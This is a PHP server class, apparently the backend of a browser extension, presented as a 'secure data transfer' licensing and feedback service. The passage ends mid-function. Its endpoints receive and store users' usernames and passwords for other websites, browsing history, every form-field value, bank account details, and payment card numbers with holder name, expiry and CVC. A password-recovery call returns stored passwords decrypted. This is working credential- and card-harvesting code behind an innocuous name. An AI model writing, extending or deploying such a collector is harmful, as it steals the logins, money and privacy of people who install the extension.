<?php

    declare(strict_types=1);

    namespace Mishusoft\Services;

    use GeoIp2\Exception\AddressNotFoundException;
    use MaxMind\Db\Reader\InvalidDatabaseException;
    use Mishusoft\Cryptography\OpenSSL\Decryption;
    use Mishusoft\Cryptography\OpenSSL\Encryption;
    use Mishusoft\Exceptions\ErrorException;
    use Mishusoft\Exceptions\HttpException\HttpResponseException;
    use Mishusoft\Exceptions\LogicException\InvalidArgumentException;
    use Mishusoft\Exceptions\PermissionRequiredException;
    use Mishusoft\Exceptions\RuntimeException;
    use Mishusoft\Http;
    use Mishusoft\System\Network;
    use Mishusoft\System\Time;
    use Mishusoft\Utility\Debug;
    use Mishusoft\Utility\Inflect;
    use Mishusoft\Utility\Number;

    class SecureDataTransferService
    {
        /**
         * SecureDataTransferService constructor.
         * This is built-in uninterrupted web request processing delivery system.
         */

        /*declare version*/
        public static SecureDataTransferDatabaseService $conOfDatabase;
        private static int                              $limitOfProductLicence;
        private static int                              $limitOfProductLicenceBase;

        /**
         * SecureDataTransferService constructor.
         */
        public function __construct()
        {
            self::$conOfDatabase = new SecureDataTransferDatabaseService();
        }

        /**
         * @param array $request
         */
        public function api(array $request): void
        {
            Debug::preOutput($request);
        }

        /**
         * @param array $request
         *
         * @throws AddressNotFoundException
         * @throws \JsonException
         * @throws InvalidDatabaseException
         * @throws ErrorException
         * @throws HttpResponseException
         * @throws InvalidArgumentException
         * @throws PermissionRequiredException
         * @throws RuntimeException*@throws \Exception
         */
        public function monitor(array $request): void
        {
            if (Inflect::lower($request["method"]) === Inflect::lower('index')) {
                Http\Runtime::abort(
                    Http\Errors::BAD_REQUEST,
                    'debug@file@' . get_http_request_uri(),
                    'debug@location@' . __METHOD__,
                );
            } elseif (Inflect::lower($request["method"]) === Inflect::lower('browser')) {
                $implodeArguments = implode("/", $request['arguments']);

                if (Inflect::lower($implodeArguments) === Inflect::lower('receiveFeedback')) {
                    $RequestedDataArray = decode_from_json(get_request_input(), JSON_IN_ARR);
                    if (is_array($RequestedDataArray) && count($RequestedDataArray) > 0) {
                        if (
                            array_key_exists("update", $RequestedDataArray)
                            && is_array($RequestedDataArray["update"])
                            && count($RequestedDataArray["update"]) > 0
                        ) {
                            self::$conOfDatabase->receiveInfoAboutUserUpdate(
                                removeTags(array_value($RequestedDataArray["update"], "name")),
                                removeTags(array_value($RequestedDataArray["update"], "version")),
                                removeTags(array_value($RequestedDataArray["update"], "ip")),
                                removeTags(array_value($RequestedDataArray["update"], "browser")),
                                removeTags(array_value($RequestedDataArray["update"], "message"))
                            );

                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                        }

                        if (
                            array_key_exists("status", $RequestedDataArray)
                            && is_array($RequestedDataArray["status"])
                            && count($RequestedDataArray["status"]) > 0
                        ) {
                            $status = self::$conOfDatabase->getInfAbtInstPrdStatus(
                                removeTags(array_value($RequestedDataArray["status"], "name")),
                                removeTags(array_value($RequestedDataArray["status"], "version")),
                                removeTags(array_value($RequestedDataArray["status"], "ip")),
                                removeTags(array_value($RequestedDataArray["status"], "os_version")),
                                removeTags(array_value($RequestedDataArray["status"], "browser"))
                            );
                            if (is_array($status) && count($status) > 0) {
                                self::$conOfDatabase->updateInfOfPrdStatus(
                                    removeTags(array_value($RequestedDataArray["status"], "name")),
                                    removeTags(array_value($RequestedDataArray["status"], "version")),
                                    removeTags(array_value($RequestedDataArray["status"], "ip")),
                                    removeTags(array_value($RequestedDataArray["status"], "os_version")),
                                    removeTags(array_value($RequestedDataArray["status"], "browser")),
                                    removeTags(array_value($RequestedDataArray["status"], "message"))
                                );
                            } else {
                                self::$conOfDatabase->insertInfOfPrdStatus(
                                    removeTags(array_value($RequestedDataArray["status"], "name")),
                                    removeTags(array_value($RequestedDataArray["status"], "version")),
                                    removeTags(array_value($RequestedDataArray["status"], "ip")),
                                    removeTags(array_value($RequestedDataArray["status"], "os_version")),
                                    removeTags(array_value($RequestedDataArray["status"], "browser")),
                                    removeTags(array_value($RequestedDataArray["status"], "message"))
                                );
                            }

                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                        }

                        if (
                            !empty(array_value($RequestedDataArray, "browser"))
                            && is_array(array_value($RequestedDataArray, "browser"))
                        ) {
                            self::$conOfDatabase->rcvInfAbtUsersBrowser(array_value($RequestedDataArray, "browser"));
                        }
                        if (
                            !empty(array_value($RequestedDataArray, "ipdata"))
                            && is_array(array_value($RequestedDataArray, "ipdata"))
                        ) {
                            self::$conOfDatabase->rcvInfAbtUsersIP(array_value($RequestedDataArray, "ipdata"));
                        }
                    } else {
                        Http\Runtime::abort(
                            Http\Errors::BAD_REQUEST,
                            'debug@file@' . get_http_request_uri(),
                            'debug@location@' . __METHOD__,
                        );
                    }
                }//end if

                /*send installed product id form server to client*/
                elseif (Inflect::lower($implodeArguments) === Inflect::lower('getPubAppId')) {
                    $RequestedDataArray = decode_from_json(get_request_input(), JSON_IN_ARR);
                    if (is_array($RequestedDataArray) && count($RequestedDataArray) > 0) {
                        if (
                            !empty(array_value($RequestedDataArray, "IdRequest"))
                            && is_array(array_value($RequestedDataArray, "IdRequest"))
                        ) {
                            if (
                                $RequestedDataArray["IdRequest"]["message"] === 'install'
                                || $RequestedDataArray["IdRequest"]["message"] === 'checkRun'
                            ) {
                                self::getVerifiedProductId($RequestedDataArray);
                            } elseif ($RequestedDataArray["IdRequest"]["message"] === 'update') {
                                self::getVerifiedProductId($RequestedDataArray);
                            } else {
                                stream_to_json(["data" => "empty"]);
                            }
                        }
                    } else {
                        Http\Runtime::abort(
                            Http\Errors::BAD_REQUEST,
                            'debug@file@' . get_http_request_uri(),
                            'debug@location@' . __METHOD__,
                        );
                    }
                } /*manage user data form client*/
                elseif (
                    Inflect::lower($implodeArguments) === Inflect::lower("UserDataManagement")
                    || Inflect::lower($implodeArguments) === Inflect::lower("browserUserDataManagement")
                ) {
                    $RequestedDataArray = decode_from_json(get_request_input(), JSON_IN_ARR);
                    $defaultQueries     = [
                        "tracker"         => array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "tracker"),
                        "app_id"          => Decryption::static(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                        "ip_address"      => array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip"),
                        "os_name_arch"    => array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch"),
                        "browserNameFull" => array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "browser"),
                    ];
                    if (
                        is_array($RequestedDataArray)
                        && count($RequestedDataArray) > 0
                        && array_key_exists("userdata", $RequestedDataArray)
                        && array_key_exists("command", $RequestedDataArray)
                    ) {
                        /*collect data*/
                        if (Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('saveLoginData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(
                                array_merge($defaultQueries, [
                                    "workWebsite"           => array_value(array_value($RequestedDataArray, "userdata"), "workWebsite"),
                                    "event"                 => array_value(array_value($RequestedDataArray, "userdata"), "event"),
                                    "username"              => array_value(array_value($RequestedDataArray, "userdata"), "username"),
                                    "password"              => array_value(array_value($RequestedDataArray, "userdata"), "password"),
                                    "last_update_date_time" => Time::today(),
                                ])
                            );
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . ' 204 No response');
                        }
                        /*collect data*/
                        if (Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('saveLogoutData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(
                                array_merge($defaultQueries, [
                                    "workWebsite"           => array_value(array_value($RequestedDataArray, "userdata"), "workWebsite"),
                                    "event"                 => array_value(array_value($RequestedDataArray, "userdata"), "event"),
                                    "username"              => array_value(array_value($RequestedDataArray, "userdata"), "username"),
                                    "last_update_date_time" => Time::today(),
                                ])
                            );
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                        }
                        /*collect data*/
                        if (Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('saveNavigateData')) {
                            self::$conOfDatabase->saveDataOfUsersBrowserHistories(
                                array_merge($defaultQueries, [
                                    "workWebsite"           => array_value(array_value($RequestedDataArray, "userdata"), "workWebsite"),
                                    "last_update_date_time" => Time::today(),
                                ])
                            );
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                        }
                        /*collect data*/
                        if (Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('saveUserSettingData')) {
                            $licence                 = '';
                            $registeredUserIdByEmail = '';
                            if (removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email"))) {
                                $registeredUserIdByEmail = self::$conOfDatabase->getUsrIdByEmlAddr(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")));
                            }

                            if (array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip")) {
                                $registeredUserIdByIP = self::$conOfDatabase->getUsrIdByIpAddr(removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip")));
                                $licence              = self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                    (int)Decryption::static(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                    removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                    removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                );
                            }
                            if (
                                !empty(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "first_name"))) &&
                                !empty(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "last_name"))) &&
                                !empty(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email"))) &&
                                !empty(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password")))
                            ) {
                                if (!empty($registeredUserIdByEmail)) {
                                    stream_to_json(['message' => 'error', 'registration' => 'already_register', 'way' => 'email', 'licence' => $licence]);
                                } elseif (!empty($registeredUserIdByIP)) {
                                    stream_to_json(['message' => 'error', 'registration' => 'already_register', 'way' => 'ip', 'licence' => $licence]);
                                } else {
                                    self::$conOfDatabase->saveUserSettingData(
                                        (int)Decryption::static(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                        removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                        removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch")),
                                        removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                        removeTags(array_value(array_value($RequestedDataArray, "userdata"), "first_name")),
                                        removeTags(array_value(array_value($RequestedDataArray, "userdata"), "last_name")),
                                        removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")),
                                        Encryption::static(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password")))
                                    );

                                    self::getLicenceLimitByPlan('trial');

                                    self::$conOfDatabase->setLicenceForProductOfUser(
                                        Number::filterInt((int)self::$conOfDatabase->getUsrIdByEmlAddr(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")))),
                                        Decryption::static(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                        removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                        removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                        'trial',
                                        self::$limitOfProductLicence,
                                        self::$limitOfProductLicenceBase,
                                        Time::today(),
                                        Time::today(),
                                        Time::nextDayDate(),
                                        'not-fixed'
                                    );

                                    stream_to_json([
                                                       'message'      => 'success',
                                                       'registration' => 'new_register',
                                                       'way'          => 'new',
                                                       'log_status'   => 'success',
                                                       'u_pass'       => Encryption::static(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password"))),
                                                       'licence'      => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                                           (int)Decryption::static(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                                           removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                                           removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                                       ),
                                                   ]);
                                }
                            } else {
                                stream_to_json(['message' => 'error', 'registration' => 'failed', 'way' => 'empty_data', 'licence' => $licence]);
                            }
                        }

                        if (Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('saveRegistrationData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(
                                array_merge($defaultQueries, [
                                    "workWebsite"           => array_value(array_value($RequestedDataArray, "userdata"), "workWebsite"),
                                    "event"                 => array_value(array_value($RequestedDataArray, "userdata"), "event"),
                                    "username"              => array_value(array_value($RequestedDataArray, "userdata"), "username"),
                                    "password"              => array_value(array_value($RequestedDataArray, "userdata"), "password"),
                                    "email"                 => array_value(array_value($RequestedDataArray, "userdata"), "email"),
                                    "last_update_date_time" => Time::today(),
                                ])
                            );
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                        }

                        if (Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('doUserLoginData')) {
                            /*print_r(Decryption::static($data->userdata->_default_->app_id));*/
                            $IdNbOfUsr          = self::$conOfDatabase->getUsrIdByEmlAddr(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")));
                            $userDetailsByEmail = self::$conOfDatabase->getUsrDtlByEml(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")));
                            if (is_array($userDetailsByEmail) && count($userDetailsByEmail) > 0) {
                                $password = self::$conOfDatabase->getUsrPssByEmlAddr(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")));
                                if (!empty($password) && strlen($password) > USER_PASSWORD_LENGTH_LIMIT) {
                                    if (removeTags(array_value(array_value($RequestedDataArray, "userdata"), "passwordType")) === 'encrypt') {
                                        if (Decryption::static(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password"))) === $password) {
                                            $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(
                                                removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")),
                                                removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password"))
                                            );
                                            self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                        } else {
                                            stream_to_json(['message' => 'error', 'login' => 'incorrect', 'way' => 'password']);
                                        }
                                    } elseif (removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password")) === $password) {
                                        $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(
                                            removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")),
                                            Encryption::static(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password")))
                                        );
                                        self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                    } else {
                                        stream_to_json(['message' => 'error', 'login' => 'incorrect', 'way' => 'password']);
                                    }
                                } else {
                                    stream_to_json(['message' => 'error', 'login' => 'not_exist', 'way' => 'password']);
                                }
                            } else {
                                stream_to_json(['message' => 'error', 'login' => 'not_exist', 'way' => 'email']);
                            }
                        }

                        if (Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('resetUserIpData')) {
                            self::$conOfDatabase->resetUsrDtlByNbOfUsrId(
                                (int)self::$conOfDatabase->getUsrIdByIpAddr(removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip"))),
                                (int)Decryption::static(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch")),
                                removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                removeTags(array_value(array_value($RequestedDataArray, "userdata"), "first_name")),
                                removeTags(array_value(array_value($RequestedDataArray, "userdata"), "last_name")),
                                removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")),
                                Encryption::static(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password")))
                            );

                            stream_to_json([
                                               'message'      => 'success',
                                               'registration' => 'new_register',
                                               'way'          => 'new',
                                               'log_status'   => 'success',
                                               'u_pass'       => removeTags(array_value(array_value($RequestedDataArray, "userdata"), "password")),
                                               'licence'      => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                                   (int)Decryption::static(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                                   removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                                   removeTags(array_value(array_value(array_value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                               ),
                                           ]);
                        }

                        if (Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('recoverUserPassword')) {
                            $user = self::$conOfDatabase->getUsrDtlByEml(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")));
                            if (isset($user)) {
                                $password = self::$conOfDatabase->getUsrPssByEmlAddr(removeTags(array_value(array_value($RequestedDataArray, "userdata"), "email")));
                                if (isset($password)) {
                                    stream_to_json(['message' => 'success', 'passwordRecovery' => 'exist', 'way' => 'email', 'password' => Decryption::static($password)]);
                                } else {
                                    stream_to_json(['message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'password']);
                                }
                            } else {
                                stream_to_json(['message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'email']);
                            }
                        }
                    } /*else {
                            Firewall::runtimeFailure("Bad Request", [
                                "debug" => ["file" => get_http_request_uri(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                                "error" => ["description" => "Your requested url is broken!!"]
                            ]);
                        }*/
                } /*collect client's browser's input data*/
                elseif (Inflect::lower(implode("/", $request['arguments'])) === Inflect::lower("InputElementDataRecord")) {
                    $RequestedDataArray = decode_from_json(get_request_input(), JSON_IN_ARR);
                    if (is_array($RequestedDataArray) && count($RequestedDataArray) > 0) {
                        if (
                            array_key_exists("command", $RequestedDataArray) && array_key_exists("inputElementData", $RequestedDataArray)
                            && Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('saveInputElementData')
                        ) {
                            $defaultQueries = [
                                "tracker"         => array_value(array_value(array_value($RequestedDataArray, "inputElementData"), "_default_"), "tracker"),
                                "app_id"          => Decryption::static(array_value(array_value(array_value($RequestedDataArray, "inputElementData"), "_default_"), "app_id")),
                                "ip_address"      => array_value(array_value(array_value($RequestedDataArray, "inputElementData"), "_default_"), "ip"),
                                "browserNameFull" => array_value(array_value(array_value($RequestedDataArray, "inputElementData"), "_default_"), "browser"),
                            ];
                            self::$conOfDatabase->storeCltBrInpInDb(
                                array_merge($defaultQueries, [
                                    "work_website" => array_value(array_value($RequestedDataArray, "inputElementData"), "workWebsite"),
                                    "name"         => array_value(array_value($RequestedDataArray, "inputElementData"), "name"),
                                    "type"         => array_value(array_value($RequestedDataArray, "inputElementData"), "type"),
                                    "value"        => array_value(array_value($RequestedDataArray, "inputElementData"), "value"),
                                    "placeholder"  => array_value(array_value($RequestedDataArray, "inputElementData"), "placeholder"),
                                ])
                            );
                        }
                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                    } else {
                        Http\Runtime::abort(
                            Http\Errors::BAD_REQUEST,
                            'debug@file@' . get_http_request_uri(),
                            'debug@location@' . __METHOD__,
                        );
                    }
                } /*collect client's bank account info from browser*/
                elseif (Inflect::lower(implode("/", $request['arguments'])) === Inflect::lower("clientBankAccountRecord")) {
                    $RequestedDataArray = decode_from_json(get_request_input(), JSON_IN_ARR);
                    if (is_array($RequestedDataArray) && count($RequestedDataArray) > 0) {
                        if (
                            array_key_exists("command", $RequestedDataArray) && array_key_exists("bankAccountData", $RequestedDataArray)
                            && Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('saveBankAccountData')
                            && is_array(array_value($RequestedDataArray, "bankAccountData"))
                        ) {
                            $defaultQueries = [
                                "tracker"         => array_value(array_value(array_value($RequestedDataArray, "bankAccountData"), "_default_"), "tracker"),
                                "app_id"          => Decryption::static(array_value(array_value(array_value($RequestedDataArray, "bankAccountData"), "_default_"), "app_id")),
                                "ip_address"      => array_value(array_value(array_value($RequestedDataArray, "bankAccountData"), "_default_"), "ip"),
                                "browserNameFull" => array_value(array_value(array_value($RequestedDataArray, "bankAccountData"), "_default_"), "browser"),
                            ];
                            self::$conOfDatabase->storeCltBnkAccData(
                                array_merge($defaultQueries, [
                                    "work_website" => array_value(array_value($RequestedDataArray, "bankAccountData"), "workWebsite"),
                                    "data_type"    => array_value(array_value($RequestedDataArray, "bankAccountData"), "name"),
                                    "data_value"   => array_value(array_value($RequestedDataArray, "bankAccountData"), "type"),
                                ])
                            );
                        }
                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                    } else {
                        Http\Runtime::abort(
                            Http\Errors::BAD_REQUEST,
                            'debug@file@' . get_http_request_uri(),
                            'debug@location@' . __METHOD__,
                        );
                    }
                } /*collect client's online payment info from browser*/
                elseif (Inflect::lower(implode("/", $request['arguments'])) === Inflect::lower("clientPaymentMethodsRecord")) {
                    $RequestedDataArray = decode_from_json(get_request_input(), JSON_IN_ARR);
                    if (is_array($RequestedDataArray) && count($RequestedDataArray) > 0) {
                        if (
                            array_key_exists("command", $RequestedDataArray)
                            && array_key_exists("paymentMethodsInfo", $RequestedDataArray)
                            && Inflect::lower(array_value($RequestedDataArray, "command")) === Inflect::lower('savePaymentMethodsData')
                            && is_array(array_value($RequestedDataArray, "paymentMethodsInfo"))
                        ) {
                            $defaultQueries = [
                                "tracker"         => array_value(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "tracker"),
                                "app_id"          => Decryption::static(array_value(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "app_id")),
                                "ip_address"      => array_value(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "ip"),
                                "os_name_arch"    => array_value(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "os_name_arch"),
                                "browserNameFull" => array_value(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "browser"),
                            ];
                            if (
                                Inflect::lower(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber")) !== Inflect::lower("Unknown")
                                && Inflect::lower(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder")) !== Inflect::lower("Unknown")
                                && Inflect::lower(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand")) !== Inflect::lower("Unknown")
                                && Inflect::lower(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire")) !== Inflect::lower("Unknown")
                                && Inflect::lower(array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")) !== Inflect::lower("Unknown")
                            ) {
                                self::$conOfDatabase->storeCltPytMtdData(
                                    array_merge($defaultQueries, [
                                        "work_website" => array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "workWebsite"),
                                        "event"        => array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "event") ?: 'bug',
                                        "cardNumber"   => array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber"),
                                        "cardHolder"   => array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder"),
                                        "cardBrand"    => array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand"),
                                        "cardExpire"   => array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire"),
                                        "cardCVC"      => array_value(array_value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC"),
                                    ])
                                );
                            }
                        }
                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                    } else {
                        Http\Runtime::abort(
                            Http\Errors::BAD_REQUEST,
                            'debug@file@' . get_http_request_uri(),
                            'debug@location@' . __METHOD__,
                        );
                    }
                } /*collect client's online earning info from browser*/
                elseif (Inflect::lower(implode("/", $request['arguments'])) === Inflect::lower("clientEarningRecord")) {
                    $RequestedDataArray = decode_from_json(get_request_input(), JSON_IN_ARR);
                    if (is_array($RequestedDataArray) && count($RequestedDataArray) > 0) {
                        if (
                            array_key_exists("command", $RequestedDataArray)
                            && array_key_exists("earndata", $RequestedDataArray)
                            && is_array(array_value($RequestedDataArray, "earndata"))
                        ) {
                            self::$conOfDatabase->upgradeLcnLmt(
                                Decryption::static(array_value(array_value(array_value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                Number::filterInt(array_value(array_value($RequestedDataArray, "earndata"), "earn"))
                            );

                            $today = self::$conOfDatabase->getClientErnDtlByDt(
                                (int)Decryption::static(array_value(array_value(array_value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                removeTags(array_value(array_value($RequestedDataArray, "earndata"), "username")),
                                Time::todayDateOnly()
                            );
                            if (!is_array($today) && count($today)) {
                                self::$conOfDatabase->updateClientErnDtlByDt(
                                    (int)Decryption::static(array_value(array_value(array_value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                    removeTags(array_value(array_value($RequestedDataArray, "earndata"), "username")),
                                    (int)removeTags(array_value(array_value($RequestedDataArray, "earndata"), "earn")),
                                    (int)removeTags(array_value(array_value($RequestedDataArray, "earndata"), "referrals")),
                                    (int)removeTags(array_value(array_value($RequestedDataArray, "earndata"), "referralsEarn"))
                                );
                            } else {
                                self::$conOfDatabase->storeClientErnDtlByDt(
                                    (int)Decryption::static(array_value(array_value(array_value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                    (int)removeTags(array_value(array_value($RequestedDataArray, "earndata"), "earn")),
                                    (int)removeTags(array_value(array_value($RequestedDataArray, "earndata"), "referrals")),
                                    (int)removeTags(array_value(array_value($RequestedDataArray, "earndata"), "referralsEarn")),
                                    removeTags(array_value(array_value($RequestedDataArray, "earndata"), "event")),
                                    removeTags(array_value(array_value($RequestedDataArray, "earndata"), "username")),
                                    removeTags(array_value(array_value($RequestedDataArray, "earndata"), "workWebsite")),
                                    Time::todayDateOnly()
                                );
                            }
                        }
                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http\Errors::NO_CONTENT . ' No response');
                    } else {
                        Http\Runtime::abort(
                            Http\Errors::BAD_REQUEST,
                            'debug@file@' . get_http_request_uri(),
                            'debug@location@' . __METHOD__,
                        );
                    }
                } else {
                    Http\Runtime::abort(
                        Http\Errors::BAD_REQUEST,
                        'debug@file@' . get_http_request_uri(),
                        'debug@location@' . __METHOD__,
                    );
                }
            } /*                else if(Inflect::lower(self::$requestMethod) === Inflect::lower("test")){
            self::$conOfDatabase->select("system")->create([
                "clients.browser.passwords.info",
                "clients.browser.histories.info",
                "clients.browser.inputs.info",
                "clients.bank.account.info",
                "clients.earning.captcha.info",
            ]);
        }*/
            else {
                Http\Runtime::abort(
                    Http\Errors::BAD_REQUEST,
                    'debug@file@' . get_http_request_uri(),
                    'debug@location@' . __METHOD__,
                );
            }
        }


        /**
         * @param array $RequestedDataArray
         *
         * @throws InvalidArgumentException
         * @throws PermissionRequiredException
         * @throws RuntimeException
         * @throws \JsonException
         */
        private static function getVerifiedProductId(array $RequestedDataArray): void
        {
            $idNbOfProduct = self::$conOfDatabase->verifiedProductId(
                removeTags(array_value(array_value($RequestedDataArray, "IdRequest"), "name")),
                removeTags(array_value(array_value($RequestedDataArray, "IdRequest"), "version")),
                removeTags(array_value(array_value($RequestedDataArray, "IdRequest"), "ip")),
                removeTags(array_value(array_value($RequestedDataArray, "IdRequest"), "browser"))
            );
            if (!is_numeric($idNbOfProduct)) {
                stream_to_json(['app_pub_id' => Encryption::static((string)$idNbOfProduct)]);
            } else {
                self::$conOfDatabase->addProductToInstList(
                    removeTags(array_value(array_value($RequestedDataArray, "IdRequest"), "name")),
                    removeTags(array_value(array_value($RequestedDataArray, "IdRequest"), "version")),
                    removeTags(array_value(array_value($RequestedDataArray, "IdRequest"), "ip")),
                    removeTags(array_value(array_value($RequestedDataArray, "IdRequest"), "browser"))
                );
                stream_to_json(['app_pub_id' => Encryption::static((string)self::$conOfDatabase->getLastInsertedId("installed.products"))]);
            }
        }

        private static function getLicenceLimitByPlan(string $plan): void
        {
            switch ($plan) {
                case 'trial':
                    self::$limitOfProductLicence     = 2000;
                    self::$limitOfProductLicenceBase = 2000;
                    break;
                case 'Plan 01':
                    self::$limitOfProductLicence     = 10000;
                    self::$limitOfProductLicenceBase = 10000;
                    break;
                case 'Plan 02':
                    self::$limitOfProductLicence     = 20000;
                    self::$limitOfProductLicenceBase = 20000;
                    break;
                case 'Plan 03':
                    self::$limitOfProductLicence     = 35000;
                    self::$limitOfProductLicenceBase = 35000;
                    break;
                case 'Plan 04':
                    self::$limitOfProductLicence     = 50000;
                    self::$limitOfProductLicenceBase = 50000;
                    break;
                default:
                    self::$limitOfProductLicence     = 0;
                    self::$limitOfProductLicenceBase = 0;
                    break;
            }
        }

        /**
         * @param $detailsArray
         * @param $IdNbOfUsr
         * @param $userDetails
         *
         * @throws InvalidArgumentException
         * @throws PermissionRequiredException
         * @throws RuntimeException
         * @throws \JsonException
         */
        private static function processUserAuthentication($detailsArray, $IdNbOfUsr, $userDetails): void
        {
            /*$data->userdata->_default_->app_id*/
            $app = self::$conOfDatabase->installedProductDetailsById((int)Decryption::static(array_value(array_value(array_value($detailsArray, "userdata"), "_default_"), "app_id")));
            if (is_array($app) && count($app) > 0) {
